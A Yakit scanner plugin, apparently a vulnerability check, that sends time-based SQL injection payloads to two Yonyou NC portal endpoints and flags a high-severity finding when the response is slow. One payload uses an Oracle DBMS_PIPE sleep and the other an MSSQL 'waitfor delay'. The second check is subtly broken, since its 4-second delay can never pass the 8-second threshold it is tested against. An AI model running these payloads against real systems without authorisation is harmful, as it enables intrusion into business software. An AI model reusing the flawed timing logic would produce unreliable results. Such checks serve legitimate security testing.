# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `GET /portal/pt/psnImage/download?pageId=login&pk_psndoc=1%27)%20AND%206322=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(79)||CHR(66)||CHR(101),8)%20AND%20(%27rASZ%27=%27rASZ HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
`
	begin_time=time.now()
    rsp,req,_ = poc.HTTP(packet1, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
	resp_time1=time.Since(begin_time)
    
    if int(resp_time1) > 8000000000{
        yakit.Info("%v found 用友NC psnImage/download存在SQL注入漏洞", addr)
        risk.NewRisk(
        addr,
        risk.title("用友NC psnImage/download存在SQL注入漏洞"),
        risk.severity("high"),
        risk.titleVerbose("用友NC psnImage/download存在SQL注入漏洞"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
    )
    }

    packet2 = `GET /portal/pt/link/content?pageId=login&pk_funnode=1'waitfor+delay+'0:0:4'-- HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
`
	begin_time=time.now()
    rsp,req,_ = poc.HTTP(packet2, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
	resp_time2=time.Since(begin_time)
    
    if int(resp_time2) > 8000000000{
        yakit.Info("%v found 用友NC link/content存在SQL注入漏洞", addr)
        risk.NewRisk(
        addr,
        risk.title("用友NC link/content存在SQL注入漏洞"),
        risk.severity("high"),
        risk.titleVerbose("用友NC link/content存在SQL注入漏洞"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
    )
    }
    return
}



handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
    
}
